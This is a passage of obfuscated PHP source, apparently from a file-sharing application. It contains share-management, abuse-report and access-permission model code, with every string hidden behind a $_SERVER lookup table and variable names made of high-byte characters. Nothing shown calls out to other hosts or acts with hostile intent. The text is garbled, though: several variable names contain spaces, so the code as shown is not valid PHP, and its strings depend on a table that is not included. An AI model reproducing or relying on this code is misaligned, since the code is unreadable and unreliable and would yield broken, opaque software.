$ë€âò´Ó[569] => array($ë€âò´Ó[7], $¨Êˆ¬ñÈ)), $ë€âò´Ó[2100] => $ë€âò´Ó[2053]); } $í†€ß— = Model($ë€âò´Ó[666])->where($¿µœê×é)->selectPage($Ñ”ñë×¼); $ÒûªŸîö = array_to_keyvalue_group($í†€ß—[$ë€âò´Ó[445]], $ë€âò´Ó[665]); if (!$ÒûªŸîö) { return $í†€ß—; } $‰¿–”Äã = $ë€âò´Ó[2103]; $¿µœê×é = array($ë€âò´Ó[665] => array($ë€âò´Ó[492], array_keys($ÒûªŸîö)), $ë€âò´Ó[1752] => array($ë€âò´Ó[1072], $ë€âò´Ó[228])); $£‹…å  = $this->field($‰¿–”Äã)->where($¿µœê×é)->select(); foreach ($£‹…å  as $ˆû¶‹Š => &$Ş²Ñ–·) { $Ş²Ñ–·[$ë€âò´Ó[2099]] = $ÒûªŸîö[$Ş²Ñ–·[$ë€âò´Ó[665]]]; } unset($Ş²Ñ–·); $ì¢Ó»‹œ = array($ë€âò´Ó[2104] => $£‹…å , $ë€âò´Ó[2105] => $í†€ß—[$ë€âò´Ó[442]]); return $ì¢Ó»‹œ; } protected function shareAdd($¡À¢¢½, $¿œˆú°–) { $Ìí‚íì­ =& $_SERVER[‹è™Ü¸Ñ]; $Â°¹±× = $this->_addShareData($¡À¢¢½, $¿œˆú°–); if (!empty($¿œˆú°–[$Ìí‚íì­[2106]])) { $this->_shareAuthSet($Â°¹±×, $¿œˆú°–[$Ìí‚íì­[2106]]); } $this->shareEventAdd($¡À¢¢½, $¿œˆú°–, $Ìí‚íì­[2107]); return $Â°¹±×; } protected function shareAddSystem($ºéÅÑÚ¤, $¶ö¤¸‚) { $‡¬™İõø =& $_SERVER[‹è™Ü¸Ñ]; $šà¶±Öµ = $this->_addShareData($ºéÅÑÚ¤, $¶ö¤¸‚, $‡¬™İõø[191]); $this->_shareAuthSet($šà¶±Öµ, $¶ö¤¸‚[$‡¬™İõø[2106]]); return $šà¶±Öµ; } private function shareEventAdd($Ïµş ‹¥, $œß¼¥ÖŸ, $ … áĞ = "\141\x64\x64") { $Éè÷ïÌ€ =& $_SERVER[‹è™Ü¸Ñ]; if (!$Ïµş ‹¥ || $Ïµş ‹¥ == $Éè÷ïÌ€[228]) { return; } if ($ … áĞ == $Éè÷ïÌ€[2107]) { if ($œß¼¥ÖŸ[$Éè÷ïÌ€[562]] == $Éè÷ïÌ€[91]) { Model($Éè÷ïÌ€[633])->eventShare($Ïµş ‹¥, $Éè÷ïÌ€[2108]); } if ($œß¼¥ÖŸ[$Éè÷ïÌ€[663]] == $Éè÷ïÌ€[91]) { Model($Éè÷ïÌ€[633])->eventShare($Ïµş ‹¥, $Éè÷ïÌ€[2109]); } return; } $Øáå¼Ùñ = $this->getInfoByPath($Ïµş ‹¥); $¡½µæ‘ò = $Éè÷ïÌ€[2110]; if ($Øáå¼Ùñ[$Éè÷ïÌ€[562]] == $Éè÷ïÌ€[228] && $œß¼¥ÖŸ[$Éè÷ïÌ€[562]] == $Éè÷ïÌ€[91]) { $¡½µæ‘ò = $Éè÷ïÌ€[2108]; } if ($Øáå¼Ùñ[$Éè÷ïÌ€[562]] == $Éè÷ïÌ€[91] && $œß¼¥ÖŸ[$Éè÷ïÌ€[562]] == $Éè÷ïÌ€[228]) { $¡½µæ‘ò = $Éè÷ïÌ€[2111]; } if ($Øáå¼Ùñ[$Éè÷ïÌ€[663]] == $Éè÷ïÌ€[228] && $œß¼¥ÖŸ[$Éè÷ïÌ€[663]] == $Éè÷ïÌ€[91]) { $¡½µæ‘ò = $Éè÷ïÌ€[2109]; } if ($Øáå¼Ùñ[$Éè÷ïÌ€[663]] == $Éè÷ïÌ€[91] && $œß¼¥ÖŸ[$Éè÷ïÌ€[663]] == $Éè÷ïÌ€[228]) { $¡½µæ‘ò = $Éè÷ïÌ€[2112]; } Model($Éè÷ïÌ€[633])->eventShare($Ïµş ‹¥, $¡½µæ‘ò); return; } private function _addShareData($¬¯Í¾Ã¢, $±÷§ãáä = array(), $ÉáÍú¿ = false) { $çÕò«Ú½ =& $_SERVER[‹è™Ü¸Ñ]; $ÇıÔ¸˜Ì = $ÉáÍú¿ == $çÕò«Ú½[191] ? 0 : USER_ID; $Ú‰ªÇ‰ = array($çÕò«Ú½[491] => $¬¯Í¾Ã¢, $çÕò«Ú½[1743] => $ÇıÔ¸˜Ì); if ($¬¯Í¾Ã¢ == 0) { $Ú‰ªÇ‰ = array($çÕò«Ú½[2113] => $±÷§ãáä[$çÕò«Ú½[1237]], $çÕò«Ú½[1743] => $ÇıÔ¸˜Ì); } if ($’Ñ¤ø = $this->where($Ú‰ªÇ‰)->find()) { return $’Ñ¤ø[$çÕò«Ú½[665]]; } if ($¬¯Í¾Ã¢ == 0) { $¤ğôÉìğ = array($çÕò«Ú½[32] => get_path_this($±÷§ãáä[$çÕò«Ú½[87]])); } else { $¤ğôÉìğ = Model($çÕò«Ú½[879])->sourceInfo($¬¯Í¾Ã¢); if (!$¤ğôÉìğ) { return !1; } } if (!$±÷§ãáä[$çÕò«Ú½[1639]]) { $±÷§ãáä[$çÕò«Ú½[1639]] = $¤ğôÉìğ[$çÕò«Ú½[32]]; } $Ì¹ó„à = array($çÕò«Ú½[1743] => $ÇıÔ¸˜Ì, $çÕò«Ú½[491] => $¬¯Í¾Ã¢, $çÕò«Ú½[1639] => $çÕò«Ú½[12], $çÕò«Ú½[562] => 0, $çÕò«Ú½[663] => 0, $çÕò«Ú½[1237] => $çÕò«Ú½[12], $çÕò«Ú½[383] => $çÕò«Ú½[12], $çÕò«Ú½[947] => $çÕò«Ú½[12], $çÕò«Ú½[2114] => 0, $çÕò«Ú½[2115] => 0, $çÕò«Ú½[816] => 0, $çÕò«Ú½[2116] => $çÕò«Ú½[12], $çÕò«Ú½[2097] => $çÕò«Ú½[12]); $ÙüôĞŒÕ = explode($çÕò«Ú½[50], $çÕò«Ú½[2117]); foreach ($ÙüôĞŒÕ as $Èşİéêõ) { if (!isset($±÷§ãáä[$Èşİéêõ])) { continue; } $Ì¹ó„à[$Èşİéêõ] = $±÷§ãáä[$Èşİéêõ]; } $‹‡â–âÛ = $this->add($Ì¹ó„à); $™å™¿¥¯ = array($çÕò«Ú½[2097] => short_id($‹‡â–âÛ)); $this->where(array($çÕò«Ú½[2118] => $‹‡â–âÛ))->save($™å™¿¥¯); return $‹‡â–âÛ; } private function _shareAuthSet($©¦˜š›Ë, $Ÿ¸ßäú) { $Æ‡³‰¡ =& $_SERVER[‹è™Ü¸Ñ]; if (!is_array($Ÿ¸ßäú)) { return !1; } $‡é©œü = Model($Æ‡³‰¡[2063]); $‡é©œü->where(array($Æ‡³‰¡[665] => $©¦˜š›Ë))->delete(); $ö¨£«”À = array(); foreach ($Ÿ¸ßäú as $›Çáşï…) { $é¤£æ÷ = SourceModel::TYPE_USER; if ($›Çáşï…[$Æ‡³‰¡[190]] == SourceModel::TYPE_GROUP) { $é¤£æ÷ = SourceModel::TYPE_GROUP; } $îµÓˆØµ = array($Æ‡³‰¡[665] => $©¦˜š›Ë, $Æ‡³‰¡[190] => $é¤£æ÷, $Æ‡³‰¡[569] => intval($›Çáşï…[$Æ‡³‰¡[569]]), $Æ‡³‰¡[2059] => 0, $Æ‡³‰¡[2119] => -1); if ($›Çáşï…[$Æ‡³‰¡[2059]]) { $îµÓˆØµ[$Æ‡³‰¡[2059]] = $›Çáşï…[$Æ‡³‰¡[2059]]; } else { if ($›Çáşï…[$Æ‡³‰¡[2119]]) { $îµÓˆØµ[$Æ‡³‰¡[2119]] = $›Çáşï…[$Æ‡³‰¡[2119]]; } } $ö¨£«”À[] = $îµÓˆØµ; } return $‡é©œü->addAll($ö¨£«”À, array(), !0); } public function numViewAdd($üàÍÒ›) { $Ñ§ñ€•ª =& $_SERVER[‹è™Ü¸Ñ]; $™Ã·Ñ†ó = array($Ñ§ñ€•ª[2118] => $üàÍÒ›); $this->where($™Ã·Ñ†ó)->setAdd($Ñ§ñ€•ª[2114]); } public function numDownloadAdd($×çÇ÷Çƒ) { $‘‚ëÇĞÒ =& $_SERVER[‹è™Ü¸Ñ]; $“…Æ÷¶÷ = array($‘‚ëÇĞÒ[2118] => $×çÇ÷Çƒ); $this->where($“…Æ÷¶÷)->setAdd($‘‚ëÇĞÒ[2115]); } protected function shareEdit($’£ö, $öÖ£‹Ë‘) { $úá–ºŸ =& $_SERVER[‹è™Ü¸Ñ]; $õµ‡Ïóµ = $this->getInfo($’£ö); if (!$õµ‡Ïóµ) { return !1; } $this->_checkLinkShare($öÖ£‹Ë‘, $õµ‡Ïóµ); $¶ïØ¤±â = array(); $˜É‹¥¢– = explode($úá–ºŸ[50], $úá–ºŸ[2120]); foreach ($˜É‹¥¢– as $ŞºÜé™¬) { if (!array_key_exists($ŞºÜé™¬, $öÖ£‹Ë‘)) { continue; } $¶ïØ¤±â[$ŞºÜé™¬] = $öÖ£‹Ë‘[$ŞºÜé™¬]; } $this->shareEventAdd($õµ‡Ïóµ[$úá–ºŸ[193]], $öÖ£‹Ë‘, $úá–ºŸ[1920]); $this->where(array($úá–ºŸ[2118] => $’£ö))->save($¶ïØ¤±â); if (isset($öÖ£‹Ë‘[$úá–ºŸ[2106]])) { $this->_shareAuthSet($’£ö, $öÖ£‹Ë‘[$úá–ºŸ[2106]]); } return !0; } private function _checkLinkShare($¥«Û´¬ö, $¹Óô€¢Ñ) { $ã¶…ë© =& $_SERVER[‹è™Ü¸Ñ]; if ($¥«Û´¬ö[$ã¶…ë©[562]] != $ã¶…ë©[91]) { return; } $º¤İğìå = $¹Óô€¢Ñ[$ã¶…ë©[90]][$ã¶…ë©[193]]; if ($¹Óô€¢Ñ[$ã¶…ë©[90]][$ã¶…ë©[33]] != $ã¶…ë©[230]) { $­Ëé ¸¾ = $this->_folderReport($º¤İğìå); if (!$­Ëé ¸¾) { return; } show_json(LNG($ã¶…ë©[2121]) . $ã¶…ë©[2122] . $­Ëé ¸¾, !1); } $²ş£§¥ = Model($ã¶…ë©[879])->fileInfoGet($¹Óô€¢Ñ[$ã¶…ë©[90]][$ã¶…ë©[193]]); if (!$²ş£§¥) { return; } $éçîòşë = $this->shareFileMeta($²ş£§¥[$ã¶…ë©[541]]); if (isset($éçîòşë[$ã¶…ë©[450]]) && $éçîòşë[$ã¶…ë©[450]] == $ã¶…ë©[91]) { show_json(LNG($ã¶…ë©[2123]), !1); } } private function _folderReport($èÉÜâè±) { $••ùâÛ =& $_SERVER[‹è™Ü¸Ñ]; $Ù‹ŒˆŞ = array($••ùâÛ[541] => array($••ùâÛ[1070], 0), $••ùâÛ[805] => 3); $ö¶—¥•§ = Model($••ùâÛ[2124])->where($Ù‹ŒˆŞ)->field($••ùâÛ[541])->select(); if (!$ö¶—¥•§) { return !1; } $ö¶—¥•§ = array_to_keyvalue($ö¶—¥•§, $••ùâÛ[12], $••ùâÛ[541]); $¬œ£şÎ” = $••ùâÛ[50] . $èÉÜâè± . $••ùâÛ[50]; $Ù‹ŒˆŞ = array($••ùâÛ[541] => array($••ùâÛ[7], $ö¶—¥•§), $••ùâÛ[584] => array($••ùâÛ[459], "\x25{$¬œ£şÎ”}\x25"), $••ùâÛ[505] => 0); $‡³Ü–†¼ = Model($••ùâÛ[879])->where($Ù‹ŒˆŞ)->field($••ùâÛ[2125])->find(); if (!$‡³Ü–†¼) { return !1; } $Å…‹ó‰‹ = substr($‡³Ü–†¼[$••ùâÛ[584]], strpos($‡³Ü–†¼[$••ùâÛ[584]], $¬œ£şÎ”)); $Ù‹ŒˆŞ = array($••ùâÛ[193] => array($••ùâÛ[7], trim($Å…‹ó‰‹, $••ùâÛ[50]))); $ô­²è÷˜ = Model($••ùâÛ[879])->where($Ù‹ŒˆŞ)->field($••ùâÛ[32])->select(); $šÊØÁùÌ = array_to_keyvalue($ô­²è÷˜, $••ùâÛ[12], $••ùâÛ[32]); $šÊØÁùÌ[] = $‡³Ü–†¼[$••ùâÛ[32]]; return implode($••ùâÛ[8], $šÊØÁùÌ); } protected function remove($½ô’–ê¹) { $æóßŞÈî =& $_SERVER[‹è™Ü¸Ñ]; $›Óë¼Í· = is_array($½ô’–ê¹) ? $½ô’–ê¹ : array($½ô’–ê¹); for ($ûŸƒ·Û® = 0; $ûŸƒ·Û® < count($›Óë¼Í·); $ûŸƒ·Û®++) { $Ö¦Ş›ë = $this->getInfo($›Óë¼Í·[$ûŸƒ·Û®]); if ($Ö¦Ş›ë[$æóßŞÈî[663]] == $æóßŞÈî[91]) { Model($æóßŞÈî[633])->eventShare($Ö¦Ş›ë[$æóßŞÈî[193]], $æóßŞÈî[2112]); } if ($Ö¦Ş›ë[$æóßŞÈî[562]] == $æóßŞÈî[91]) { Model($æóßŞÈî[633])->eventShare($Ö¦Ş›ë[$æóßŞÈî[193]], $æóßŞÈî[2111]); } } if (is_array($½ô’–ê¹)) { $½ô’–ê¹ = array($æóßŞÈî[7], $½ô’–ê¹); } $É«ê¹Ëè = array($æóßŞÈî[665] => $½ô’–ê¹); $‰ÂšîòÈ = $this->where($É«ê¹Ëè)->delete(); if ($‰ÂšîòÈ) { Model($æóßŞÈî[666])->where(array($æóßŞÈî[665] => $½ô’–ê¹))->delete(); } return $‰ÂšîòÈ; } protected function removeBySource($‘şÔê¯) { $è„–ÉÛ =& $_SERVER[‹è™Ü¸Ñ]; $²ØĞ ¹Á = array($è„–ÉÛ[491] => array($è„–ÉÛ[492], $‘şÔê¯)); $û½Ü½±¢ = $this->field($è„–ÉÛ[665])->where($²ØĞ ¹Á)->select(); $û½Ü½±¢ = array_to_keyvalue($û½Ü½±¢, $è„–ÉÛ[12], $è„–ÉÛ[665]); if (!$û½Ü½±¢) { return; } $²ØĞ ¹Á = array($è„–ÉÛ[2118] => array($è„–ÉÛ[492], $û½Ü½±¢)); $this->where($²ØĞ ¹Á)->delete(); Model($è„–ÉÛ[666])->where($²ØĞ ¹Á)->delete(); } public function listAll($¥¡ÕÀÕŠ) { $‘È­‘ä =& $_SERVER[‹è™Ü¸Ñ]; $¤Æ¼çÒ¹ = array(); if ($¥¡ÕÀÕŠ[$‘È­‘ä[1752]]) { $¤Æ¼çÒ¹[$‘È­‘ä[1752]] = $¥¡ÕÀÕŠ[$‘È­‘ä[1752]]; } if ($¥¡ÕÀÕŠ[$‘È­‘ä[815]]) { $’Ç½‚Ú® = $¥¡ÕÀÕŠ[$‘È­‘ä[816]] ? $¥¡ÕÀÕŠ[$‘È­‘ä[816]] : strtotime(date($‘È­‘ä[2126])); $¤Æ¼çÒ¹[$‘È­‘ä[231]] = array($‘È­‘ä[409], array($¥¡ÕÀÕŠ[$‘È­‘ä[815]], $’Ç½‚Ú®)); } if ($¥¡ÕÀÕŠ[$‘È­‘ä[33]]) { $¤Æ¼çÒ¹[$¥¡ÕÀÕŠ[$‘È­‘ä[33]]] = 1; } else { $¤Æ¼çÒ¹[] = array($‘È­‘ä[562] => array($‘È­‘ä[1070], 0), $‘È­‘ä[663] => array($‘È­‘ä[1070], 0), $‘È­‘ä[2100] => $‘È­‘ä[2053]); } if ($¥¡ÕÀÕŠ[$‘È­‘ä[2049]]) { $¤Æ¼çÒ¹[] = array($‘È­‘ä[2097] => $¥¡ÕÀÕŠ[$‘È­‘ä[2049]], $‘È­‘ä[1639] => array($‘È­‘ä[459], "\45{$¥¡ÕÀÕŠ[$‘È­‘ä[2049]]}\x25"), $‘È­‘ä[2100] => $‘È­‘ä[2053]); } $‘Ş¯óşû = $this->_makeOrder()->where($¤Æ¼çÒ¹)->selectPage(20); if (empty($‘Ş¯óşû[$‘È­‘ä[445]])) { return array(); } $this->_listDataApply($‘Ş¯óşû[$‘È­‘ä[445]]); return $‘Ş¯óşû; } public function listDataApply($½ëƒ§¯Î) { $this->_listDataApply($½ëƒ§¯Î); return $½ëƒ§¯Î; } private function _listDataApply(&$ùÂòØŸÚ) { $ÄÚ˜ûšË =& $_SERVER[‹è™Ü¸Ñ]; $îĞƒ­¢ë = array_to_keyvalue($ùÂòØŸÚ, $ÄÚ˜ûšË[12], $ÄÚ˜ûšË[1752]); $ªØ¬¢¦¢ = Model($ÄÚ˜ûšË[598])->userListInfo(array_unique($îĞƒ­¢ë)); $«ÀğŒ™ò = array_to_keyvalue($ùÂòØŸÚ, $ÄÚ˜ûšË[12], $ÄÚ˜ûšË[193]); $êÆÌæ› = Model($ÄÚ˜ûšË[879])->sourceListInfo($«ÀğŒ™ò, !0); foreach ($ùÂòØŸÚ as $Ò­”Ûò’ => &$óñ½³ÊÇ) { $±µ½»Ş° = $óñ½³ÊÇ[$ÄÚ˜ûšË[1752]]; $óñ½³ÊÇ[$ÄÚ˜ûšË[2127]] = $ªØ¬¢¦¢[$±µ½»Ş°] ? $ªØ¬¢¦¢[$±µ½»Ş°] : !1; $£¬£æâÜ = $óñ½³ÊÇ[$ÄÚ˜ûšË[193]]; $óñ½³ÊÇ[$ÄÚ˜ûšË[90]] = $êÆÌæ›[$£¬£æâÜ] ? $êÆÌæ›[$£¬£æâÜ] : !1; if ($óñ½³ÊÇ[$ÄÚ˜ûšË[90]][$ÄÚ˜ûšË[505]] == $ÄÚ˜ûšË[91]) { unset($ùÂòØŸÚ[$Ò­”Ûò’]); } if ($óñ½³ÊÇ[$ÄÚ˜ûšË[90]] != $ÄÚ˜ûšË[228] && !$óñ½³ÊÇ[$ÄÚ˜ûšË[90]]) { unset($ùÂòØŸÚ[$Ò­”Ûò’]); } } unset($óñ½³ÊÇ); $ùÂòØŸÚ = array_values($ùÂòØŸÚ); } private function _makeOrder($®Û¶¸õ = '') { $íãÛÛØ° =& $_SERVER[‹è™Ü¸Ñ]; $™°Ğ©”Œ = array($íãÛÛØ°[231], $íãÛÛØ°[816], $íãÛÛØ°[2114], $íãÛÛØ°[2115]); $óãúø¥î = array($íãÛÛØ°[523] => $íãÛÛØ°[524], $íãÛÛØ°[525] => $íãÛÛØ°[526]); $²éôÁ“Ê = Input::get($íãÛÛØ°[530], $íãÛÛØ°[7], $íãÛÛØ°[497], $™°Ğ©”Œ); $¡àıš¶ = Input::get($íãÛÛØ°[531], $íãÛÛØ°[7], $íãÛÛØ°[2128], array($íãÛÛØ°[2046], $íãÛÛØ°[525])); $¡àıš¶ = $óãúø¥î[$¡àıš¶]; $®Û¶¸õ = $®Û¶¸õ . "{$²éôÁ“Ê}\x20{$¡àıš¶}"; return $this->order($®Û¶¸õ); } public function reportAdd($Ó…¢¸) { $¹Ãš°àê =& $_SERVER[‹è™Ü¸Ñ]; $óïñÄÇæ = array($¹Ãš°àê[665] => $Ó…¢¸[$¹Ãš°àê[665]], $¹Ãš°àê[1752] => USER_ID); if (Model($¹Ãš°àê[2124])->where($óïñÄÇæ)->find()) { return !1; } $ÌÊ›Ò = array($¹Ãš°àê[665] => $Ó…¢¸[$¹Ãš°àê[665]], $¹Ãš°àê[1639] => $Ó…¢¸[$¹Ãš°àê[1639]], $¹Ãš°àê[193] => $Ó…¢¸[$¹Ãš°àê[193]], $¹Ãš°àê[541] => $Ó…¢¸[$¹Ãš°àê[541]], $¹Ãš°àê[1752] => USER_ID, $¹Ãš°àê[33] => $Ó…¢¸[$¹Ãš°àê[33]], $¹Ãš°àê[526] => $Ó…¢¸[$¹Ãš°àê[526]]); return Model($¹Ãš°àê[2124])->add($ÌÊ›Ò); } public function reportList($‚ñ×¦Ü‹) { $—Ãâ®†Ğ =& $_SERVER[‹è™Ü¸Ñ]; $§ìŒØ¤ = array(); if ($‚ñ×¦Ü‹[$—Ãâ®†Ğ[815]]) { $ËÍÛ½Àæ = $‚ñ×¦Ü‹[$—Ãâ®†Ğ[816]] ? $‚ñ×¦Ü‹[$—Ãâ®†Ğ[816]] : strtotime(date($—Ãâ®†Ğ[2126])); $§ìŒØ¤[$—Ãâ®†Ğ[231]] = array($—Ãâ®†Ğ[409], array($‚ñ×¦Ü‹[$—Ãâ®†Ğ[815]], $ËÍÛ½Àæ)); } if (isset($‚ñ×¦Ü‹[$—Ãâ®†Ğ[33]]) && in_array($‚ñ×¦Ü‹[$—Ãâ®†Ğ[33]], array($—Ãâ®†Ğ[91], $—Ãâ®†Ğ[510], $—Ãâ®†Ğ[2129], $—Ãâ®†Ğ[2130], $—Ãâ®†Ğ[2131]))) { $§ìŒØ¤[$—Ãâ®†Ğ[33]] = $‚ñ×¦Ü‹[$—Ãâ®†Ğ[33]]; } if (isset($‚ñ×¦Ü‹[$—Ãâ®†Ğ[805]]) && in_array($‚ñ×¦Ü‹[$—Ãâ®†Ğ[805]], array($—Ãâ®†Ğ[228], $—Ãâ®†Ğ[91], $—Ãâ®†Ğ[510], $—Ãâ®†Ğ[2129]))) { $§ìŒØ¤[$—Ãâ®†Ğ[805]] = $‚ñ×¦Ü‹[$—Ãâ®†Ğ[805]]; } $íß½ßÁ = Input::get($—Ãâ®†Ğ[531], $—Ãâ®†Ğ[7], $—Ãâ®†Ğ[2128], array($—Ãâ®†Ğ[2046], $—Ãâ®†Ğ[525])); $ğİ•¥ÁÏ = array($—Ãâ®†Ğ[523] => $—Ãâ®†Ğ[524], $—Ãâ®†Ğ[525] => $—Ãâ®†Ğ[526]); $¿úâğÎ = $—Ãâ®†Ğ[2132] . $ğİ•¥ÁÏ[$íß½ßÁ]; $ÛçéàõË = Model($—Ãâ®†Ğ[2124])->where($§ìŒØ¤)->order($¿úâğÎ)->selectPage(20); if (empty($ÛçéàõË[$—Ãâ®†Ğ[445]])) { return array(); } $‰¸àºı = array_to_keyvalue_group($ÛçéàõË[$—Ãâ®†Ğ[445]], $—Ãâ®†Ğ[805], $—Ãâ®†Ğ[665]); if (!empty($‰¸àºı[0])) { $‚ñ×¦Ü‹ = $‰¸àºı[0]; $§ìŒØ¤ = array($—Ãâ®†Ğ[665] => array($—Ãâ®†Ğ[7], $‚ñ×¦Ü‹)); $¸œ¥÷Ó‹ = $this->where($§ìŒØ¤)->field($—Ãâ®†Ğ[665])->select(); $¸œ¥÷Ó‹ = array_to_keyvalue($¸œ¥÷Ó‹, $—Ãâ®†Ğ[12], $—Ãâ®†Ğ[665]); $ÌÇëÁ‡Ó = array_diff($‚ñ×¦Ü‹, $¸œ¥÷Ó‹); if (!empty($ÌÇëÁ‡Ó)) { foreach ($ÛçéàõË[$—Ãâ®†Ğ[445]] as $õ¿Ôæ®• => $–·ª•˜•) { if (in_array($–·ª•˜•[$—Ãâ®†Ğ[665]], $ÌÇëÁ‡Ó)) { unset($ÛçéàõË[$—Ãâ®†Ğ[445]][$õ¿Ôæ®•]); } } } } $this->_listDataApply($ÛçéàõË[$—Ãâ®†Ğ[445]]); return $ÛçéàõË; } public function reportStatus($¿Ğ”¶¼) { $ƒøŒôŒí =& $_SERVER[‹è™Ü¸Ñ]; $ÆÇŸËöá = array($ƒøŒôŒí[475] => $¿Ğ”¶¼[$ƒøŒôŒí[475]]); $è×ù›£„ = Model($ƒøŒôŒí[2124])->where($ÆÇŸËöá)->field($ƒøŒôŒí[2133])->find(); if (!$è×ù›£„) { return !1; } $¢ÇÄ¢‹ê = array($ƒøŒôŒí[805] => $¿Ğ”¶¼[$ƒøŒôŒí[805]]); if ($¿Ğ”¶¼[$ƒøŒôŒí[805]] == $ƒøŒôŒí[2129] && $è×ù›£„[$ƒøŒôŒí[805]] == $ƒøŒôŒí[2129]) { $¢ÇÄ¢‹ê[$ƒøŒôŒí[805]] = 0; } $óëòíª¾ = Model($ƒøŒôŒí[2124])->where($ÆÇŸËöá)->save($¢ÇÄ¢‹ê); if ($¿Ğ”¶¼[$ƒøŒôŒí[805]] == $ƒøŒôŒí[510]) { if ($è×ù›£„[$ƒøŒôŒí[541]] != $ƒøŒôŒí[228] && $this->shareFileMeta($è×ù›£„[$ƒøŒôŒí[541]])) { $this->shareFileMeta($è×ù›£„[$ƒøŒôŒí[541]], 0); } $this->remove($è×ù›£„[$ƒøŒôŒí[665]]); return !0; } if ($óëòíª¾ && $¿Ğ”¶¼[$ƒøŒôŒí[805]] == $ƒøŒôŒí[2129]) { $Ù÷Ì°Ú” = $¢ÇÄ¢‹ê[$ƒøŒôŒí[805]] == $ƒøŒôŒí[2129] ? 1 : 0; $this->shareFileMeta($è×ù›£„[$ƒøŒôŒí[541]], $Ù÷Ì°Ú”); $this->removeByFile($è×ù›£„[$ƒøŒôŒí[541]]); } return $óëòíª¾; } private function removeByFile($à¿Ûı»­) { $•Ü¢í©› =& $_SERVER[‹è™Ü¸Ñ]; $²Òâ™˜Â = Model($•Ü¢í©›[879])->where(array($•Ü¢í©›[541] => $à¿Ûı»­))->field($•Ü¢í©›[193])->select(); $€ú‘âÉÇ = array_to_keyvalue($²Òâ™˜Â, $•Ü¢í©›[12], $•Ü¢í©›[193]); $ƒß™İ«´ = array($•Ü¢í©›[193] => array($•Ü¢í©›[7], $€ú‘âÉÇ), $•Ü¢í©›[562] => 1); $²Òâ™˜Â = $this->where($ƒß™İ«´)->field($•Ü¢í©›[665])->select(); if (empty($²Òâ™˜Â)) { return; } $÷ßÍŞÓ– = array_to_keyvalue($²Òâ™˜Â, $•Ü¢í©›[12], $•Ü¢í©›[665]); $this->remove($÷ßÍŞÓ–); } private function shareFileMeta($Ÿ³Õ‡†, $™îÙÎº = null) { $—ÛîşñÑ =& $_SERVER[‹è™Ü¸Ñ]; $£Ã¯  = array($—ÛîşñÑ[541] => $Ÿ³Õ‡†, $—ÛîşñÑ[97] => $—ÛîşñÑ[2134]); if (is_null($™îÙÎº)) { return Model($—ÛîşñÑ[2135])->where($£Ã¯ )->find(); } $£Ã¯ [$—ÛîşñÑ[450]] = $™îÙÎº; Model($—ÛîşñÑ[2135])->add($£Ã¯ , array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\x75\x72\143\145\x5f\141\x75\x74\x68"; public function getAuth($ê—à½Ùë) { $ÑÄïæñÒ =& $_SERVER[‹è™Ü¸Ñ]; $Úü˜’ı¢ = $this->sourceAuthSelect($ê—à½Ùë); $Ê±ùÉ¥ = array(); $ò†Ô…šÒ = array(); $¨æ×¯Åå = 2 << 25; foreach ($Úü˜’ı¢ as $ª±İÌº) { $ö‚Ä‚ñˆ = Model($ÑÄïæñÒ[571])->listData($ª±İÌº[$ÑÄïæñÒ[2059]]); if (!$ö‚Ä‚ñˆ) { continue; } $Ê±ùÉ¥[] = $ª±İÌº; $ÚÊëÌÚ = 0; if ($ª±İÌº[$ÑÄïæñÒ[190]] == SourceModel::TYPE_GROUP) { $ÚÊëÌÚ = $¨æ×¯Åå * 2; } if ($ª±İÌº[$ÑÄïæñÒ[190]] == SourceModel::TYPE_USER) { $ÚÊëÌÚ = $¨æ×¯Åå; } if ($ª±İÌº[$ÑÄïæñÒ[190]] == SourceModel::TYPE_USER && $ª±İÌº[$ÑÄïæñÒ[569]] == $ÑÄïæñÒ[228]) { $ÚÊëÌÚ = 0; } $ò†Ô…šÒ[] = $ö‚Ä‚ñˆ[$ÑÄïæñÒ[487]] + $ÚÊëÌÚ; } array_multisort($ò†Ô…šÒ, SORT_DESC, $Ê±ùÉ¥); return $Ê±ùÉ¥; } public function sourceAuthSelect($–”ßÙ”¼) { $”˜—Ä›” =& $_SERVER[‹è™Ü¸Ñ]; static $•ˆÆ†× = array(); $×½ñãÄ = is_array($–”ßÙ”¼) ? !1 : !0; if ($×½ñãÄ) { $–”ßÙ”¼ = array($–”ßÙ”¼); } $™‰®½£Á = array(); foreach ($–”ßÙ”¼ as $À’õŞ€) { if (isset($•ˆÆ†×[$À’õŞ€])) { $™‰®½£Á[$À’õŞ€] = $•ˆÆ†×[$À’õŞ€]; } } if (count($™‰®½£Á) == count($–”ßÙ”¼)) { return $×½ñãÄ ? $™‰®½£Á[$–”ßÙ”¼[0]] : $™‰®½£Á; } $‹”ø¸ï‚ = $”˜—Ä›”[2136]; $§àšÓÆ“ = array($”˜—Ä›”[193] => array($”˜—Ä›”[7], $–”ßÙ”¼)); $œ¶Àƒ˜Ì = $this->field($‹”ø¸ï‚)->order($”˜—Ä›”[475])->where($§àšÓÆ“)->select(); $ŠÌªİÄæ = array_to_keyvalue_group($œ¶Àƒ˜Ì, $”˜—Ä›”[193]); foreach ($–”ßÙ”¼ as $À’õŞ€) { $•ˆÆ†×[$À’õŞ€] = $ŠÌªİÄæ[$À’õŞ€] ? $ŠÌªİÄæ[$À’õŞ€] : array(); } if ($×½ñãÄ) { return $œ¶Àƒ˜Ì; } return $ŠÌªİÄæ; } public function setAuth($½ê´„Â, $¨ô¥êëÁ) { $ñë¤°ø” =& $_SERVER[‹è™Ü¸Ñ]; $²™©‘Í‘ = Model($ñë¤°ø”[1398])->sourceInfo($½ê´„Â); if (!$²™©‘Í‘) { return !1; } if ($²™©‘Í‘[$ñë¤°ø”[190]] != SourceModel::TYPE_GROUP) { return !1; } $éşÁÊ‰ğ = 1; $åûÈ½ıã = $²™©‘Í‘[$ñë¤°ø”[569]]; if ($åûÈ½ıã != $éşÁÊ‰ğ) { $™ÀÊèøï = array($ñë¤°ø”[1951] => $åûÈ½ıã); $¤ÅÖ³ò« = Model($ñë¤°ø”[2045])->field($ñë¤°ø”[1752])->where($™ÀÊèøï)->select(); $¤ÅÖ³ò« = array_to_keyvalue($¤ÅÖ³ò«, $ñë¤°ø”[12], $ñë¤°ø”[1752]); } $¥ªÕôä = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Ê‡Ãğ” = array(); foreach ($¨ô¥êëÁ as $‚Âó’…î) { if (!in_array($‚Âó’…î[$ñë¤°ø”[190]], $¥ªÕôä)) { show_json(LNG($ñë¤°ø”[2137]), !1); } if ($åûÈ½ıã != $éşÁÊ‰ğ) { if ($‚Âó’…î[$ñë¤°ø”[190]] == SourceModel::TYPE_GROUP) { } if 